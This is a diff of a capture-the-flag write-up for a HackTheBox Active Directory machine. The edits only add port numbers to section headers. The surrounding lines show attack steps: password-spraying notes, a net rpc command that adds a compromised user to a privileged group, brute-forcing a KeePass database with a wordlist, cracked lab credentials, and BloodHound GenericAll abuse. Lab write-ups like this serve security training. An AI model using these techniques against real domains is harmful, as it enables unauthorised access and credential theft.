@@ -30,7 +30,7 @@ PORT      STATE SERVICE       REASON          VERSION
 
 - assume compromized box with given creds: levi.james / KingofAkron2025!
 
-# SMB
+# SMB 445/tcp
 
 - since we have creds we can try to get domain info with NXC and dump ldap with bloodhound:
 ```bash
@@ -51,7 +51,7 @@ SMB         10.10.11.70     445    DC               Account Lockout Threshold: N
 we are can password spray
 
 - we can only read default shares, but there's a "DEV" share "DEV-SHARE for PUPPY-DEVS"
-# LDAP
+# LDAP 389/tcp
 
 - we have no asrep - krbroast
 
@@ -76,7 +76,7 @@ graph LR
 net rpc group addmem "DEVELOPERS" "levi.james" -U "puppy.htb"/"levi.james"%'KingofAkron2025!' -S "10.10.11.70"
 ```
 
-# SMB
+# SMB 445/tcp
 
 - we can check again on the shares, and indeed we have access to DEV share
 - we can see a keepass db:
@@ -106,7 +106,7 @@ python3 bfkeepass.py -d ../../loot/smb/recovery.kdbx -w /usr/share/wordlists/roc
 SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\ant.edwards:Antman2025! 
 ```
 
-# LDAP
+# LDAP 389/tcp
 
 - in bloodhound we can see that the user ant.edwards has the GenericAll on adam.silver:
 ```mermaid
